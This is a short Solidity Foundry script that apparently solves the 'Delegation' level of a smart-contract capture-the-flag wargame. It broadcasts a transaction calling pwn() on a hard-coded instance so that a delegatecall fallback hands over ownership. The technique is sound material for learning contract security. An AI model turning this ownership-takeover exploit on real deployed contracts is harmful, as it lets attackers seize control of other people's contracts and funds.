// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/06-Delegation/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level06Solution is Script {
    Delegation delegationInstance = Delegation(0xed5C28AB6Df27FB3FF8c9d86aAABE5c54641a4Ad);

    function run() external {
        vm.startBroadcast();
        (bool success, ) = address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        if(success) {
            console.log("pwn!!!");
        }
        vm.stopBroadcast();
    }
}